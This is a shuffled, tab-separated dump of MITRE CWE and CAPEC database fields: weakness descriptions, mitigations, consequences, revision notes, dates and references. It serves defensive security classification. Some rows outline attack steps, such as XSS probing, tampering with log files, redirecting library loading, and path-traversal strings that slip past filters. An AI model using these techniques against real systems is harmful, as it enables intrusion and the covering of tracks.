5800	97	Escaping Virtualization
6391	36	https://www.owasp.org/index.php/Top_10_2007-A3
9168	62	added/updated demonstrative examples
22378	66	Secure Programming for Linux and Unix HOWTO
5724	62	updated Description, Observed_Examples
10880	42	Consider following the principle of separation of privilege. Require multiple conditions to be met before permitting access to a system resource.
21153	42	Use an adaptive hash function that can be configured to change the amount of computational effort needed to compute the hash, such as the number of iterations ("stretching") or the amount of memory required. Some hash functions perform salting automatically. These functions can significantly increase the overhead for a brute force attack compared to intentionally-fast functions such as MD5. For example, rainbow table attacks can become infeasible due to the high computing overhead. Finally, since computing power gets faster and cheaper over time, the technique can be reconfigured to increase the workload without forcing an entire replacement of the algorithm in use.                   Some hash functions that have one or more of these desired properties include bcrypt [REF-291], scrypt [REF-292], and PBKDF2 [REF-293]. While there is active debate about which of these is the most effective, they are all stronger than using salts with hash functions with very little computing overhead.                   Note that using these functions can have an impact on performance, so they require special consideration to avoid denial-of-service attacks. However, their configurability provides finer control over how much CPU and memory is used, so it could be adjusted to suit the environment's needs.
10038	72	The attacker could read restricted XML content.
13993	79	Integrity
9661	28	CWE Content Team
6838	42	Run or compile the software using features or extensions that automatically provide a protection mechanism that mitigates or eliminates buffer overflows.                   For example, certain compilers and extensions provide automatic buffer overflow detection mechanisms that are built into the compiled code. Examples include the Microsoft Visual Studio /GS flag, Fedora/Red Hat FORTIFY_SOURCE GCC flag, StackGuard, and ProPolice.
22882	101	CAPEC Content Team
24110	39	2010-06-21
22056	91	Implementation
13360	59	Updated References
7783	63	Alter Execution Logic
14337	95	[Manipulate Log Files] The attacker alters the log contents either directly through manipulation or forging or indirectly through injection of specially crafted input that the target software will write to the logs. This type of attack typically follows another attack and is used to try to cover the traces of the previous attack.
24705	62	updated Description, Name
8327	35	MITRE
11587	62	updated Relationships, Taxonomy_Mappings
7134	28	Eric Dalci
11873	79	Availability
10757	39	2014-07-30
20740	28	CWE Content Team
19035	46	This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.             This is similar to CWE-25, except using "\" instead of "/". Sometimes a program checks for "..\" at the beginning of the input, so a "\..\" can bypass that check. It is also useful for bypassing path traversal protection schemes that only assume that the "/" separator is valid.
10328	39	2018-03-27
6553	95	The adversary explores to gauge what level of access he has.
24295	39	2009-10-29
8296	100	The MITRE Corporation
12873	26	Architecture and Design
11222	62	updated Potential_Mitigations
15755	59	Updated Related_Weaknesses
22479	62	updated Common_Consequences
22845	35	MITRE
23031	86	http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities
9557	59	Updated Related_Attack_Patterns
14874	78	Very High
16138	31	699
18536	28	CWE Content Team
7441	59	Updated Resources_Required
10216	43	Simple
14957	62	updated Demonstrative_Examples, Description
18162	26	Operation
20943	97	ICMP IP 'ID' Field Error Message Probe
24844	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Formal Methods / Correct-By-Construction                                                                     Cost effective for partial coverage:                                                                           Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
8515	77	Manual Static Analysis - Source Code
20844	90	C
14648	28	CWE Content Team
13300	90	Language-Independent
23910	62	updated Common_Consequences
16486	35	MITRE
10705	35	MITRE
11298	58	CBC is the most commonly used mode of operation for a block cipher. It solves electronic code book's dictionary problems by XORing the ciphertext with plaintext. If it used to encrypt multiple data streams, dictionary attacks are possible, provided that the streams have a common beginning sequence.
21109	23	The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as record delimiters when they are sent to a downstream component.
16625	100	The MITRE Corporation
19594	39	2008-09-08
16733	73	Use a list of XSS probe strings to inject in parameters of known URLs. If possible, the probe strings contain a unique identifier.
22497	51	2014-06-23
20984	26	Architecture and Design
13240	23	An adversary inserts malicious logic into memory enabling them to achieve a negative impact. This logic is often hidden from the user of the system and works behind the scenes to achieve negative impacts. This pattern of attack focuses on systems already fielded and used in operation as opposed to systems that are still under development and part of the supply chain.
18934	33	Frank Kim
17123	81	Other
17928	104	579
23027	23	The code contains McCabe cyclomatic complexity that exceeds a  desirable maximum.
17442	62	updated Applicable_Platforms
18015	31	699
16132	39	2012-05-11
7399	47	Read Data
21784	28	CWE Content Team
9985	31	1000
23179	35	MITRE
11181	26	Architecture and Design
7309	62	updated Description, Potential_Mitigations, References, Relationships, Type
7534	28	CWE Content Team
25417	26	Architecture and Design
15325	67	Medium
15666	103	Primary
21364	91	Operation
7401	97	Application Fingerprinting
15909	79	Access Control
13663	62	updated Name
20765	81	Other
8054	35	MITRE
11314	33	Dmitry Chastukhin
21255	55	CAPEC Content Team
14356	95	An attacker realizes that there is a postfix data that gets in the way of getting to the desired resources
7406	100	The MITRE Corporation
13695	39	2012-05-11
19989	49	2012
23273	62	updated Applicable_Platforms, Demonstrative_Examples, Modes_of_Introduction, Relationships
24093	42	Recommendations include designing and adding consistent error handling mechanisms which are capable of handling any user input to your web application, providing meaningful detail to end-users, and preventing error messages that might provide information useful to an attacker from being displayed.
11359	62	updated Relationships
16300	35	MITRE
20096	61	Draft
6231	62	updated Relationships
13811	66	An update on the DLL-preloading remote attack vector
17608	35	MITRE
8101	31	1000
15733	35	MITRE
18526	35	MITRE
17723	61	Stable
18882	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Host Application Interface Scanner                            Fuzz Tester                            Framework-based Fuzzer                            Forced Path Execution                            Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious
8060	89	Detailed
11659	91	Testing
19256	100	The MITRE Corporation
8149	39	2017-01-19
5919	42	While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict whitelist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).
6521	76	2019-09-30
9608	39	2008-09-08
16823	35	MITRE
13058	81	Integrity
14904	26	Implementation
24570	39	2011-06-01
22846	55	CAPEC Content Team
21674	77	Dynamic Analysis with Manual Results Interpretation
16621	53	The MITRE Corporation
18999	33	Microsoft
17979	28	CWE Content Team
11633	59	Updated Attack_Motivation-Consequences, Attacker_Skills_or_Knowledge_Required, Description Summary
14510	35	MITRE
5583	86	http://csrc.nist.gov/publications/nistpubs/800-122/sp800-122.pdf
7114	86	http://jeremiahgrossman.blogspot.com/2007/01/input-validation-or-output-filtering.html
19028	74	3
20123	59	Updated Related_Attack_Patterns
11460	39	2009-03-10
18438	47	Other
19797	99	Wikipedia
19290	59	Updated Attack_Phases, Description Summary, Resources_Required
14667	26	Implementation
23728	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
14481	35	MITRE
17941	91	Implementation
21266	39	2009-05-27
6833	86	http://www.cs.rice.edu/~scrosby/hash/CrosbyWallach_UsenixSec2003/index.html
8147	103	Primary
20298	89	Meta
22103	27	Fuzzing tools.
12236	28	Eric Dalci
9638	56	ChildOf
7791	89	Standard
17394	51	2014-06-23
12925	47	Modify Data
21717	35	MITRE
6390	50	Implementation: Perform input validation for all remote content.
7361	73	The attacker finds the configuration files containing the entries to the dynamically linked libraries and modifies the entries to point to the malicious libraries the attacker crafted.
7030	76	2019-04-04
19286	35	MITRE
12812	39	2009-03-10
9182	78	High
20645	44	SOAR Partial
16053	104	464
24393	35	MITRE
17960	81	Access Control
20508	35	MITRE
22840	21	PLOVER
17755	62	updated Relationships, Taxonomy_Mappings
17480	62	updated Demonstrative_Examples
15166	103	Primary
14213	103	Primary
18840	39	2009-07-27
17769	36	https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/
22065	104	230
15385	51	2014-06-23
9198	35	MITRE
20485	53	The MITRE Corporation
17318	33	Hovav Shacham
16336	36	https://nms.kcl.ac.uk/jose.such/pubs/Assured_deletion.pdf
11273	63	Modify Application Data
21273	26	Implementation
23518	39	2008-09-08
19632	39	2009-03-10
14411	97	Terrestrial Jamming
8173	62	updated Time_of_Introduction
7130	81	Confidentiality
8530	35	MITRE
21666	69	Draft
9879	35	MITRE
10612	77	Manual Static Analysis - Source Code
8234	74	2
9624	42	Protect log files against unauthorized read/write.
22529	58	Mobile code, in this case a Java Applet, is code that is transmitted across a network and executed on a remote machine. Because mobile code developers have little if any control of the environment in which their code will execute, special security concerns become relevant. One of the biggest environmental threats results from the risk that the mobile code will run side-by-side with other, potentially malicious, mobile code. Because all of the popular web browsers execute code from multiple sources together in the same JVM, many of the security guidelines for mobile code are focused on preventing manipulation of your objects' state and behavior by adversaries who have access to the same virtual machine where your program is running.
13080	35	MITRE
9714	101	CAPEC Content Team
7564	63	Read Application Data
13354	28	CWE Content Team
14144	35	MITRE
23585	62	updated Common_Consequences
21005	81	Other
24549	62	updated Relationships
17315	45	Variant
24388	39	2009-05-27
10692	100	The MITRE Corporation
18025	77	Manual Static Analysis - Binary or Bytecode
13852	62	updated Relationships
22486	59	Updated Related_Weaknesses
24576	94	Run Arbitrary Code
17257	35	MITRE
11777	69	Draft
15234	62	updated Common_Consequences, Description, Potential_Mitigations
10739	59	Updated Related_Attack_Patterns
9886	45	Base
9087	28	CWE Content Team
6588	28	CWE Content Team
10980	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Examples-Instances, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity
7765	35	MITRE
17355	69	Incomplete
6344	79	Confidentiality
9632	28	CWE Content Team
12152	62	updated References, Relationships, Taxonomy_Mappings, White_Box_Definitions
12227	62	updated Name
18601	39	2009-03-10
13478	101	CAPEC Content Team
8286	91	Architecture and Design
5649	39	2011-06-27
19884	63	Modify Files or Directories
8237	81	Availability
9375	35	MITRE
16556	39	2012-10-30
22088	39	2014-02-18
14989	35	MITRE
8306	80	This attack can be performed by low capability attackers with freely available tools. Commercial tools are also available that can target select networks or all WiFi networks within a range of several miles.
14332	23	The product calls umask() with an incorrect argument that is specified as if it is an argument to chmod().
12239	91	Implementation
11234	62	updated Relationships
11105	62	updated Demonstrative_Examples
7198	39	2011-03-29
11387	62	updated Related_Attack_Patterns
10913	56	ChildOf
8512	31	1000
19446	62	updated Common_Consequences
19620	86	http://blogs.sans.org/appsecstreetfighter/2010/03/26/top-25-series-rank-25-race-conditions/
10017	66	6 Ways To Avoid Mass Assignment in ASP.NET MVC
8527	81	Other
24481	28	CWE Content Team
25160	35	MITRE
19486	42	While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict whitelist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).
11137	59	Updated Description Summary
22044	28	CWE Content Team
11509	35	MITRE
19174	31	699
18204	63	Read Application Data
12277	63	Read Application Data
24097	69	Incomplete
24874	21	Anonymous Tool Vendor (under NDA)
14781	28	CWE Content Team
13538	103	Primary
25406	26	Architecture and Design
22178	28	CWE Content Team
9663	35	MITRE
16837	31	1000
22679	39	2017-11-08
20412	50	Implementation: Privileges are constrained, if a script is loaded, ensure system runs in chroot jail or other limited authority mode
6482	100	The MITRE Corporation
18299	26	Architecture and Design
12208	35	MITRE
9485	24	MITRE
22890	53	The MITRE Corporation
24035	25	Low
14518	101	CAPEC Content Team
16252	39	2009-05-27
24322	21	CLASP
20472	56	ChildOf
8063	90	Language-Independent
21836	63	Other
17808	28	CWE Content Team
18575	53	The MITRE Corporation
8231	21	CWE Content Team
11552	54	Medium
23627	28	CWE Content Team
23558	62	updated Related_Attack_Patterns
7545	28	CWE Content Team
6558	52	This weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives.                   Automated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or require any code changes.                   Automated static analysis might not be able to detect the usage of custom API functions or third-party libraries that indirectly invoke OS commands, leading to false negatives - especially if the API/library code is not available for analysis.
10513	31	1000
11668	62	updated Relationships
16262	35	Cigital
5890	101	CAPEC Content Team
24455	39	2012-10-30
21584	28	CWE Content Team
15320	81	Other
23212	31	699
9812	56	CanPrecede
15918	39	2019-01-03
16490	35	MITRE
6419	85	111
16622	62	updated Relationships, Taxonomy_Mappings
18326	49	2007
11186	39	2012-10-30
24778	32	Vprde;
22184	101	CAPEC Content Team
24278	35	MITRE
10459	85	487
13143	28	CWE Content Team
21409	92	Explore
18417	63	Bypass Protection Mechanism
22292	62	updated Potential_Mitigations, Time_of_Introduction
14981	35	MITRE
14123	39	2009-10-29
8859	81	Access Control
6963	59	Updated Related_Attack_Patterns
23588	35	MITRE
20536	42	Store state information and sensitive data on the server side only.                   Ensure that the system definitively and unambiguously keeps track of its own state and user state and has rules defined for legitimate state transitions. Do not allow any application user to affect state directly in any way other than through legitimate actions leading to state transitions.                   If information must be stored on the client, do not do so without encryption and integrity checking, or otherwise having a mechanism on the server side to catch tampering. Use a message authentication code (MAC) algorithm, such as Hash Message Authentication Code (HMAC) [REF-529]. Apply this against the state or sensitive data that you has to be exposed, which can guarantee the integrity of the data - i.e., that the data has not been modified. Ensure that a strong hash function is used (CWE-328).
23579	33	OWASP
7933	31	1000
6387	62	updated Alternate_Terms, Detection_Factors, Potential_Mitigations, References, Relationships, Taxonomy_Mappings
7702	28	CWE Content Team
10002	49	2010
15469	63	DoS: Crash, Exit, or Restart
15745	40	Physical access to the system after it has left the manufacturer but before it is deployed at the victim location.
18345	28	CWE Content Team
21014	47	Other
12516	28	Eric Dalci
6935	28	CWE Content Team
19667	63	DoS: Crash, Exit, or Restart
11582	42	Pay close attention to complex conditionals that affect initialization, since some branches might not perform the initialization.
16434	35	MITRE
15864	39	2011-06-01
18775	28	CWE Content Team
15298	89	Standard
16630	63	Bypass Protection Mechanism
20830	62	updated Potential_Mitigations, Time_of_Introduction
17496	62	updated Common_Consequences
17611	101	CAPEC Content Team
18204	81	Confidentiality
16882	102	ChildOf
17740	74	4
7266	46	The HttpOnly flag directs compatible browsers to prevent client-side script from accessing cookies. Including the HttpOnly flag in the Set-Cookie HTTP response header helps mitigate the risk associated with Cross-Site Scripting (XSS) where an attacker's script code might attempt to read the contents of a cookie and exfiltrate information obtained. When set, browsers that support the flag will not reveal the contents of the cookie to a third party via client-side script executed via XSS.
10255	31	1000
21047	28	CWE Content Team
7654	63	DoS: Crash, Exit, or Restart
7203	88	Unexpected Sign Extension
23035	56	ChildOf
25390	28	CWE Content Team
6817	79	Access Control
13941	35	MITRE
11688	78	Medium
14120	62	updated Relationships, Taxonomy_Mappings
19154	35	MITRE
16924	39	2014-06-23
12044	28	KDM Analytics
15654	35	MITRE
15954	76	2019-09-30
18546	69	Draft
11020	62	CWE-247 and CWE-292 deprecated and merged into CWE-350 to address duplicates.
18027	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Bytecode Weakness Analysis - including disassembler + source code weakness analysis                            Binary Weakness Analysis - including disassembler + source code weakness analysis
18462	62	updated Time_of_Introduction
12632	42	While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict whitelist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).
8337	39	2017-11-08
13501	53	The MITRE Corporation
20393	62	updated Common_Consequences, Relationships
9033	39	2014-07-30
22231	81	Other
9542	39	2008-07-01
9151	35	MITRE
24692	35	MITRE
22081	35	Cigital
16701	77	Dynamic Analysis with Automated Results Interpretation
14692	28	CWE Content Team
13819	35	MITRE
6242	35	MITRE
22105	35	MITRE
12743	62	updated Other_Notes
23244	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.                   When validating filenames, use stringent whitelists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as "/" to avoid CWE-36. Use a whitelist of allowable file extensions, which will help to avoid CWE-434.                   Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a blacklist, which may be incomplete (CWE-184). For example, filtering "/" is insufficient protection if the filesystem also supports the use of "\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if "../" sequences are removed from the ".../...//" string in a sequential fashion, two instances of "../" would be removed from the original string, but the remaining characters would still form the "../" string.
14805	56	PeerOf
13124	62	updated Applicable_Platforms
24735	46	Many resources require initialization before they can be properly used. If a resource is not initialized, it could contain unpredictable or expired data, or it could be initialized to defaults that are invalid. This can have security implications when the resource is expected to have certain properties or values.
17723	40	The victim system must allow Lan Man or NT Lan Man authentication.
8310	63	Execute Unauthorized Code or Commands
24893	26	Implementation
13295	79	Availability
14643	85	395
19384	76	2017-05-01
5861	78	High
10201	90	C
19955	42	The Boehm-Demers-Weiser Garbage Collector or valgrind can be used to detect leaks in code.
23480	102	ChildOf
22403	89	Detailed
21704	100	The MITRE Corporation
14916	62	updated Description
22944	39	2011-06-27
10488	45	Base
10247	35	MITRE
13283	66	How Companies Can Beef Up Password Security (interview with Thomas H. Ptacek)
7793	35	MITRE
21783	90	PHP
23774	28	CWE Content Team
14695	88	Buffer Underwrite ('Buffer Underflow')
6774	103	Primary
17697	69	Draft
19945	35	MITRE
18331	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
20030	28	KDM Analytics
23663	35	MITRE
20533	81	Integrity
13817	43	Simple
12422	45	Variant
6976	39	2009-12-28
16386	63	Bypass Protection Mechanism
14182	28	CWE Content Team
18680	31	699
24574	56	ChildOf
20219	35	MITRE
19789	60	05
5728	62	updated Relationships, Taxonomy_Mappings
21170	35	MITRE
8019	62	updated Relationships, Other_Notes, References, Taxonomy_Mappings
7920	39	2015-12-07
16426	28	CWE Content Team
22882	59	Updated Attack_Motivation-Consequences
17323	31	699
17849	100	The MITRE Corporation
21199	60	05
20094	49	2013
21743	39	2012-05-11
8314	39	2011-06-27
24637	49	2008
21320	35	MITRE
21126	69	Draft
21501	45	Base
23481	28	CWE Content Team
6552	56	CanPrecede
21599	76	2015-12-07
23631	73	The attacker loads the predefined session ID into his browser and browses to protected data or functionality.
17790	88	Missing Encryption of Sensitive Data
6022	76	2015-11-09
18884	39	2019-01-03
8673	73	Execution in simulator. The attacker physically removes mass storage from the system and explores it using a simulator, external system, or other debugging harness.
11755	91	Architecture and Design
14854	56	ChildOf
24566	39	2011-06-01
17511	62	updated Demonstrative_Examples, Taxonomy_Mappings, White_Box_Definitions
13972	62	added/updated demonstrative examples
20708	62	updated Name, Taxonomy_Mappings
14096	62	updated Relationships, Taxonomy_Mappings
15308	28	CWE Content Team
21911	28	CWE Content Team
18592	101	CAPEC Content Team
14404	86	http://phrack.org/issues/49/14.html
12092	62	updated Common_Consequences, Relationships, Other_Notes
15970	63	Read Application Data
5905	62	updated Relationships, Other_Notes, Taxonomy_Mappings
10994	39	2014-07-30
21791	35	MITRE
13969	35	MITRE
24888	62	updated Demonstrative_Examples, Description, Other_Notes, Potential_Mitigations, Taxonomy_Mappings
24447	88	Use of Function with Inconsistent Implementations
11204	39	2008-07-01
20063	28	CWE Content Team
15605	45	Variant
6617	62	updated Taxonomy_Mappings
14362	81	Confidentiality
13010	81	Availability
6807	26	Operation
9968	35	MITRE
9889	26	Architecture and Design
17416	79	Integrity
10945	63	Gain Privileges or Assume Identity
17229	28	CWE Content Team
12409	61	Stable
10581	28	CWE Content Team
21307	99	ACM
23399	31	1000
18311	35	MITRE
7436	27	There are no necessary resources required for this attack.
6728	28	CWE Content Team
11419	62	updated Modes_of_Introduction, Relationships
17346	42	Use tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.
17047	39	2011-06-01
21794	56	ChildOf
20676	21	CWE Content Team
5646	56	ChildOf
12263	63	Read Files or Directories
24245	26	Implementation
9590	103	Primary
8214	42	Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.
19089	25	Low
22043	90	Language-Independent
20921	39	2012-05-11
14636	91	Architecture and Design
7022	39	2014-06-23
22879	103	Primary
15418	35	MITRE
11318	94	The adversary is able to capture potentially sensitive information and processes as they appear on the screen.
20298	27	The requirements vary depending upon the nature of the API. For application-layer APIs related to the processing of the HTTP protocol, one or more of the following may be needed: a MITM (Man-In-The-Middle) proxy, a web browser, or a programming/scripting language.
9290	28	CWE Content Team
23682	90	Language-Independent
14182	35	MITRE
18191	36	https://code.google.com/archive/p/browsersec/wikis/Main.wiki
16153	88	Covert Storage Channel
19045	47	Gain Privileges
11747	39	2009-03-10
19451	55	CAPEC Content Team
17663	28	CWE Content Team
20190	62	updated Time_of_Introduction
11550	81	Confidentiality
16075	23	The software does not properly manage privileges while it is switching between different contexts that have different privileges or spheres of control.
12106	39	2011-06-01
10324	28	CWE Content Team
6315	47	Bypass Protection Mechanism
16705	72	Since SQL databases generally hold sensitive data, loss of confidentiality is a frequent problem with SQL injection vulnerabilities.
14578	35	MITRE
24124	43	Simple
10017	33	K. Scott Allen
17468	44	High
10430	28	CWE Content Team
13095	102	ChildOf
13608	39	2014-07-30
22657	88	Runtime Resource Management Control Element in a Component Built to Run on Application Servers
8159	78	High
12630	81	Confidentiality
5679	43	Simple
10766	100	The MITRE Corporation
24968	92	Exploit
25126	63	Bypass Protection Mechanism
14668	62	updated Common_Consequences
23295	28	CWE Content Team
15423	39	2012-05-11
7944	59	Updated Attack_Phases
7557	104	828
9647	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
10642	73	Try to use UTF-8 encoding of content in Scripts in order to bypass validation routines.
23835	39	2011-09-13
17466	85	398
24562	28	CWE Content Team
9008	24	MITRE
21997	62	updated Relationships
19923	38	Traffic filtering with IDS (or proxy) can detect request with suspicious URLs. IDS may use signature based identification to reveal such URL based attacks.
24754	39	2014-07-30
23882	31	1000
16618	28	CWE Content Team
21573	70	Wikipedia
5849	62	updated Name
22032	26	Implementation
19642	62	updated Potential_Mitigations, Time_of_Introduction
7438	35	MITRE
21181	40	The application accepts the backlash character as escape character.
11558	47	Read Data
17916	103	Primary
8696	28	CWE Content Team
18874	28	CWE Content Team
21903	28	Eric Dalci
24124	69	Draft
20516	48	08
17137	56	ChildOf
22053	26	Operation
8891	90	C
21759	91	Implementation
6647	26	Implementation
8150	35	MITRE
12560	94	Run Arbitrary Code
11573	89	Detailed
19442	51	2014-06-23
6339	28	Sean Eidemiller
10598	103	Primary
20188	31	1000
17680	70	The URLEncode and URLDecode Page
6722	62	updated Potential_Mitigations
13940	25	High
24332	90	Language-Independent
19859	76	2017-05-01
24851	35	Cigital
10339	35	MITRE
10058	62	updated Description, Name
18510	28	CWE Content Team
15211	35	Cigital
6854	56	ChildOf
6007	27	None: No specialized resources are required to execute this type of attack.
12567	61	Draft
9040	103	Primary
20023	79	Availability
12507	73	Use a proxy tool to record all links visited during a manual traversal of the web application.
25273	45	Base
19037	70	Sharefuzz
24342	86	http://danamodio.com/application-security/discoveries/spring-remote-code-with-expression-language-injection/
12066	59	Updated Attack_Motivation-Consequences
15528	35	MITRE
8888	28	CWE Content Team
6011	45	Variant
7964	24	MITRE
12087	26	Implementation
7627	28	CWE Content Team
23323	42	When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.                   For example, ID 1 could map to "inbox.txt" and ID 2 could map to "profile.txt". Features such as the ESAPI AccessReferenceMap [REF-45] provide this capability.
14171	56	ChildOf
11936	39	2011-03-29
15907	28	CWE Content Team
17849	101	CAPEC Content Team
7431	43	Simple
22103	50	Test to ensure that the software behaves as per specification and that there are no unintended side effects. Ensure that no assumptions about the validity of data are made.
13190	35	MITRE
12661	28	CWE Content Team
17023	93	Defense in Depth
20666	35	MITRE
17007	31	1003
7065	39	2009-07-27
13200	100	The MITRE Corporation
19733	62	updated Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities
9180	59	Updated References
19829	39	2015-12-07
19062	101	CAPEC Content Team
14085	39	2011-06-01
5779	23	The software performs a data query with a large number of joins      and sub-queries on a large data table.
12864	70	PHP Manual
5832	62	updated Demonstrative_Examples, Relationships, Taxonomy_Mappings
12907	100	The MITRE Corporation
8832	62	updated Relationships
6741	28	CWE Content Team
7201	73	Try to use Unicode encoding of content in CSS in order to bypass validation routines.
23361	28	CWE Content Team
5853	62	updated Applicable_Platforms, Causal_Nature, Relationships
20639	35	MITRE
10532	62	updated Background_Details, Common_Consequences, Other_Notes
25392	28	CWE Content Team
12462	47	Gain Privileges
10228	46	When a web server is designed to receive a request from a client without any mechanism for verifying that it was intentionally sent, then it might be possible for an attacker to trick a client into making an unintentional request to the web server which will be treated as an authentic request. This can be done via a URL, image load, XMLHttpRequest, etc. and can result in exposure of data or unintended code execution.
24479	21	CWE Content Team
18174	39	2009-03-10
8437	34	This weakness is prevalent in handler/dispatch procedures that might want to invoke a large number of functions, or set a large number of variables.
13991	28	CWE Content Team
22389	79	Accountability
22493	28	CWE Content Team
20470	90	Language-Independent
15770	81	Confidentiality
11638	35	MITRE
18010	60	05
10270	28	CWE Content Team
9101	100	The MITRE Corporation
11992	35	MITRE
10364	39	2008-10-14
20213	72	If a signal handler interrupts code that is executing with privileges, it may be possible that the signal handler will also be executed with elevated privileges, possibly making subsequent exploits more severe.
6624	100	The MITRE Corporation
19166	62	updated Description, Relationships, Taxonomy_Mappings
17361	62	updated Applicable_Platforms, Demonstrative_Examples
23247	28	CWE Content Team
8518	35	MITRE
13701	88	Path Equivalence: 'file name' (Internal Whitespace)
17646	77	Automated Static Analysis - Source Code
14354	62	updated Taxonomy_Mappings
11360	24	MITRE
12178	39	2011-03-29
14749	103	Primary
7254	62	updated Relationships
14002	27	A software program that allows a user to man-in-the-middle communications between the client and server, such as a man-in-the-middle proxy.
17292	46	This is commonly seen in web browser vulnerabilities in which the attacker can perform certain actions while the browser is transitioning from a trusted to an untrusted domain, or vice versa, and the browser performs the actions on one domain using the trust level and resources of the other domain.
7607	35	MITRE
18703	28	CWE Content Team
18692	92	Exploit
15262	104	825
14011	78	Low
20954	39	2011-06-27
17387	79	Confidentiality
11250	62	updated Observed_Examples
19119	21	7 Pernicious Kingdoms
17700	28	CWE Content Team
10126	39	2008-10-14
14558	35	MITRE
16323	74	2
11797	97	IP Address Blocking
24399	78	Medium
16326	67	High
19336	62	updated Relationships, Taxonomy_Mappings
14439	56	ChildOf
21065	81	Integrity
15862	39	2011-03-29
20197	100	The MITRE Corporation
13427	62	updated Demonstrative_Examples
14346	35	MITRE
8876	103	Primary
23490	35	MITRE
18693	39	2011-06-01
13142	28	CWE Content Team
24508	39	2012-05-11
15531	43	Simple
11095	62	updated Time_of_Introduction
10197	39	2017-11-08
11226	39	2009-05-27
9316	104	85
7119	102	ChildOf
22846	53	The MITRE Corporation
22014	40	Access to system design documentation prior to the development phase. This access is often obtained via insider access or by leveraging another attack pattern to gain permissions that the adversary wouldn't normally have.
6517	28	CWE Content Team
16282	35	MITRE
7040	56	ChildOf
23957	69	Incomplete
16262	28	Eric Dalci
18684	24	Purdue University
5672	28	CWE Content Team
12041	63	Bypass Protection Mechanism
16387	35	MITRE
21709	31	699
17585	55	CAPEC Content Team
12565	81	Access Control
9014	28	CWE Content Team
13701	104	48
6722	39	2010-09-27
12834	92	Explore
12269	101	CAPEC Content Team
23178	53	The MITRE Corporation
19123	50	Implementation: Perform input validation for all remote content.
6672	35	MITRE
7277	43	Simple
17437	94	Depending on the use of the target buffer, an application or system crash can be achieved.
10657	62	updated Time_of_Introduction
23794	89	Detailed
14674	39	2012-05-11
12145	89	Detailed
22312	77	Automated Dynamic Analysis
17176	78	High
20322	74	4
22684	47	Gain Privileges
8216	102	ChildOf
13072	28	CWE Content Team
17498	62	updated Potential_Mitigations
12598	85	476
6390	50	Design: Use browser technologies that do not allow client side scripting.
24480	28	CWE Content Team
22562	28	CWE Content Team
9680	92	Explore
11298	90	Language-Independent
19494	62	updated Relationships
16401	57	Indirect
18149	103	Primary
19448	74	3
10949	54	High
7079	31	699
19014	28	CWE Content Team
